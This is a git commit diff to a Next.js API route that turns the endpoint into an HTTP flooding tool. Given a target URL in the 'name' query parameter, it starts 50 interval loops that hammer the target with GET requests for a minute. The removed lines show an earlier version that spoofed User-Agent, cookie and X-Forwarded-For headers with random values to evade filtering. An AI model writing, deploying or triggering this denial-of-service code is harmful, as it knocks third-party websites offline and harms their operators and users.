a35b93a60b33c1edccb4a5f31f0f60313e6d76eb
stratijia <stratijia@gmail.com>
2023-08-28 12:37:28 +0100

    htto

--- pages/api/info.ts
+++ pages/api/info.ts
@@ -1,22 +1,8 @@
 import type { NextApiRequest, NextApiResponse } from 'next'
+import http from 'http'
 
 type ResponseData = {
     message: string
-}
-
-
-const rIp = () => {
-    const r = () => Math.floor(Math.random() * 255);
-    return `${r()}.${r()}.${r()}.${r()}`;
-}
-
-const rStr = (l: number) => {
-    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
-    let s = '';
-    for (let i = 0; i < l; i++) {
-        s += a[Math.floor(Math.random() * a.length)];
-    }
-    return s;
 }
 
 export default function handler(
@@ -24,21 +10,13 @@ export default function handler(
     res: NextApiResponse<ResponseData>
 ) {
 
-    for (var i = 0; i < 20; i++) {
+    for(var i = 0; i < 50; i++) {
         const luanch = setInterval(() => {
-            fetch(`${req.query.name}?ref=${rStr(10)}`, {
-                headers: {
-                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 ${rStr(10)}`,
-                    'cookie': `key=${rStr(10)}`,
-                    'Origin': `${req.query.name}`,
-                    'Referrer': `${req.query.name}`,
-                    'X-Forwarded-For': rIp()
-                }
-            }).then()
+            http.get(`${req.query.name}?ref=${Math.random()}`)
         })
         setTimeout(() => clearInterval(luanch), 60 * 1000)
     }
-
+    
     setTimeout(() => {
         res.status(200).json({ message: `JK-${req.query.name}` })
     }, 20 * 1000)
